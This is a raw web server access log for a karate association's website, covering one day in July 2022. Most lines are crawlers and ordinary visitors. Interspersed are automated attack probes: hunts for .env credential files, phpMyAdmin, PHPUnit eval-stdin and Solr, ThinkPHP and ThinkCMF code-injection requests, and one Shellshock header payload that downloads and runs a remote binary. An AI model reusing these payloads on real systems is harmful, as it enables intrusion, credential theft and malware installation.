::ffff:185.254.196.115 - - [26/Jul/2022:08:57:58 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [26/Jul/2022:08:57:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.42 - - [26/Jul/2022:08:58:53 +0000] "GET /docs/twenty%20guiding%20principles%20of%20karate.pdf HTTP/1.1" 404 191 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:180.189.165.13 - - [26/Jul/2022:08:59:30 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:74.103.52.24 - - [26/Jul/2022:09:00:56 +0000] "GET / HTTP/1.1" - - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:09:12:04 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:54.196.98.106 - - [26/Jul/2022:09:18:55 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:40.77.167.41 - - [26/Jul/2022:09:21:31 +0000] "GET /images/BayFarmSep06.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:124.223.167.95 - - [26/Jul/2022:09:24:17 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 159 "-" "-"
::ffff:124.223.167.95 - - [26/Jul/2022:09:24:17 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 159 "-" "-"
::ffff:135.125.246.189 - - [26/Jul/2022:09:27:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [26/Jul/2022:09:27:13 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:09:29:46 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:114.119.145.192 - - [26/Jul/2022:09:32:35 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:20.122.150.135 - - [26/Jul/2022:09:34:15 +0000] "GET /json/ HTTP/1.1" 404 144 "-" "-"
::ffff:114.119.145.188 - - [26/Jul/2022:09:46:17 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:73.202.170.82 - - [26/Jul/2022:09:47:59 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:163.172.129.138 - - [26/Jul/2022:09:50:40 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:185.7.214.104 - - [26/Jul/2022:09:52:02 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:173.252.107.21 - - [26/Jul/2022:09:56:24 +0000] "HEAD / HTTP/1.1" 200 57618 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:66.249.79.165 - - [26/Jul/2022:09:59:46 +0000] "GET /schoolsandschedules.html HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.46 - - [26/Jul/2022:10:06:53 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:62.152.55.125 - - [26/Jul/2022:10:07:33 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:62.152.55.125 - - [26/Jul/2022:10:07:34 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:62.152.55.125 - - [26/Jul/2022:10:07:34 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:62.152.55.125 - - [26/Jul/2022:10:07:36 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:51.222.253.3 - - [26/Jul/2022:10:18:48 +0000] "GET /events HTTP/1.1" 200 10263 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:185.7.214.104 - - [26/Jul/2022:10:20:00 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:185.83.144.103 - - [26/Jul/2022:10:23:29 +0000] "GET /.env/credentials HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:10:28:40 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:51.222.253.13 - - [26/Jul/2022:10:28:55 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:185.254.196.115 - - [26/Jul/2022:10:33:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [26/Jul/2022:10:33:25 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.79.229 - - [26/Jul/2022:10:33:37 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.227 - - [26/Jul/2022:10:33:37 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.117 - - [26/Jul/2022:10:34:38 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:51.222.253.11 - - [26/Jul/2022:10:40:34 +0000] "GET /gallery HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:88.214.43.118 - - [26/Jul/2022:10:43:07 +0000] "GET /env/credentials HTTP/1.1" 404 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:10:46:58 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:51.222.253.11 - - [26/Jul/2022:10:51:17 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [26/Jul/2022:10:51:18 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [26/Jul/2022:10:51:19 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [26/Jul/2022:10:51:19 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:193.142.59.214 - - [26/Jul/2022:10:55:01 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:193.142.59.214 - - [26/Jul/2022:10:55:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.5 - - [26/Jul/2022:11:01:20 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:73.202.170.82 - - [26/Jul/2022:11:04:48 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:205.185.127.154 - - [26/Jul/2022:11:04:56 +0000] "GET / HTTP/1.1" 200 57618 "-" "Linux Gnu (cow)"
::ffff:135.125.246.189 - - [26/Jul/2022:11:05:20 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [26/Jul/2022:11:05:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:178.32.197.80 - - [26/Jul/2022:11:09:47 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
::ffff:51.222.253.10 - - [26/Jul/2022:11:13:23 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:185.7.214.104 - - [26/Jul/2022:11:17:38 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:40.77.167.66 - - [26/Jul/2022:11:23:48 +0000] "GET /events HTTP/1.1" 200 10263 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:51.222.253.2 - - [26/Jul/2022:11:26:19 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:73.202.170.82 - - [26/Jul/2022:11:27:56 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:66.249.79.191 - - [26/Jul/2022:11:29:29 +0000] "GET /dojoprocedures.html HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:45.195.69.125 - - [26/Jul/2022:11:35:08 +0000] "GET / HTTP/1.1" 200 57618 "() { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget http://houmen.linux22.cn:123/houmen/linux223 -O /tmp/China.Z-muks  >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-muks  >> /tmp/Run.sh;echo /tmp/China.Z-muks  >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh"" "() { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget http://houmen.linux22.cn:123/houmen/linux223 -O /tmp/China.Z-muks  >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-muks  >> /tmp/Run.sh;echo /tmp/China.Z-muks  >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh""
::ffff:51.222.253.14 - - [26/Jul/2022:11:37:51 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:73.202.170.82 - - [26/Jul/2022:11:45:37 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:51.222.253.6 - - [26/Jul/2022:11:49:25 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:185.7.214.104 - - [26/Jul/2022:11:57:10 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:185.254.196.115 - - [26/Jul/2022:11:58:37 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [26/Jul/2022:11:58:38 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.16 - - [26/Jul/2022:12:02:05 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:73.202.170.82 - - [26/Jul/2022:12:08:48 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:51.222.253.4 - - [26/Jul/2022:12:13:25 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:73.202.170.82 - - [26/Jul/2022:12:26:42 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:213.149.22.158 - - [26/Jul/2022:12:32:31 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:51.222.253.14 - - [26/Jul/2022:12:37:31 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:185.7.214.104 - - [26/Jul/2022:12:39:47 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:135.125.246.189 - - [26/Jul/2022:12:43:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [26/Jul/2022:12:43:03 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:188.165.87.111 - - [26/Jul/2022:12:43:59 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
::ffff:73.202.170.82 - - [26/Jul/2022:12:44:32 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:128.14.209.162 - - [26/Jul/2022:12:44:55 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:27.50.62.50 - - [26/Jul/2022:12:47:52 +0000] "GET /map/baidumap.xml HTTP/1.1" 404 155 "/map/baidumap.xml" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:185.173.35.61 - - [26/Jul/2022:12:52:14 +0000] "GET / HTTP/1.1" 200 57618 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
::ffff:185.7.214.104 - - [26/Jul/2022:12:58:22 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:51.222.253.4 - - [26/Jul/2022:13:00:10 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:184.105.139.68 - - [26/Jul/2022:13:11:16 +0000] "GET / HTTP/1.1" 200 57618 "-" "-"
::ffff:184.105.139.108 - - [26/Jul/2022:13:16:05 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:163.123.143.71 - - [26/Jul/2022:13:16:10 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:49 +0000] "GET / HTTP/1.0" 200 57618 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:49 +0000] "GET / HTTP/1.0" 200 57618 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:51 +0000] "GET /events HTTP/1.0" 200 10263 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:52 +0000] "GET /resources HTTP/1.0" 200 194907 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:52 +0000] "GET /schools HTTP/1.0" 200 96626 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:53 +0000] "GET /contact HTTP/1.0" 200 10017 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:53 +0000] "GET /joinemail?type=promotions HTTP/1.0" 200 8841 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:54 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.0" 200 3770165 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:54 +0000] "GET /images/tournaments/2022LEAGUEDivisions.pdf HTTP/1.0" 200 766218 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:54 +0000] "GET /joinemail?type=tournaments HTTP/1.0" 200 8829 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:54 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.0" 200 8998 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:55 +0000] "GET /contact?s=1&ss=0 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:55 +0000] "GET /contact?s=1&ss=1 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:55 +0000] "GET /contact?s=1&ss=2 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:56 +0000] "GET /contact?s=1&ss=3 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:56 +0000] "GET /contact?s=1&ss=4 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:56 +0000] "GET /contact?s=1&ss=5 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:57 +0000] "GET /contact?s=1&ss=6 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:57 +0000] "GET /contact?s=1&ss=7 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:58 +0000] "GET /contact?s=1&ss=8 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:58 +0000] "GET /contact?s=1&ss=9 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:58 +0000] "GET /contact?s=1&ss=10 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:59 +0000] "GET /contact?s=1&ss=11 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:59 +0000] "GET /contact HTTP/1.0" 200 10017 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:23:59 +0000] "GET /contact?s=1&ss=0 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:00 +0000] "GET /contact?s=1&ss=1 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:00 +0000] "GET /contact?s=1&ss=2 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:00 +0000] "GET /contact?s=1&ss=3 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:01 +0000] "GET /contact?s=1&ss=4 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:01 +0000] "GET /contact?s=1&ss=5 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:01 +0000] "GET /contact?s=1&ss=6 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:02 +0000] "GET /contact?s=1&ss=7 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:02 +0000] "GET /contact?s=1&ss=8 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:02 +0000] "GET /contact?s=1&ss=9 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:03 +0000] "GET /contact?s=1&ss=10 HTTP/1.0" 200 9997 "-" "-"
::ffff:149.102.141.214 - - [26/Jul/2022:13:24:03 +0000] "GET /contact?s=1&ss=11 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:24:55 +0000] "GET / HTTP/1.0" 200 57618 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:24:55 +0000] "GET / HTTP/1.0" 200 57618 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:24:56 +0000] "GET /events HTTP/1.0" 200 10263 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:24:56 +0000] "GET / HTTP/1.0" 200 57618 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:24:57 +0000] "GET /resources HTTP/1.0" 200 194907 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:24:57 +0000] "GET / HTTP/1.0" 200 57618 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:24:58 +0000] "GET /schools HTTP/1.0" 200 96626 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:24:58 +0000] "GET /events HTTP/1.0" 200 10263 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:24:58 +0000] "GET /contact HTTP/1.0" 200 10017 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:24:59 +0000] "GET /joinemail?type=promotions HTTP/1.0" 200 8841 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:24:59 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.0" 200 3770165 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:00 +0000] "GET /images/tournaments/2022LEAGUEDivisions.pdf HTTP/1.0" 200 766218 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:00 +0000] "GET /joinemail?type=tournaments HTTP/1.0" 200 8829 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:00 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.0" 200 8998 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:01 +0000] "GET /resources HTTP/1.0" 200 194907 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:01 +0000] "GET /contact?s=1&ss=0 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:01 +0000] "GET /contact?s=1&ss=1 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.128.157 - - [26/Jul/2022:13:25:02 +0000] "GET /contact?s=1&ss=2 HTTP/1.0" 200 9997 "-" "-"
::ffff:38.242.132.112 - - [26/Jul/2022:13:25:02 +0000] "GET /schools HTTP/1.0" 200 96626 "-" "-"
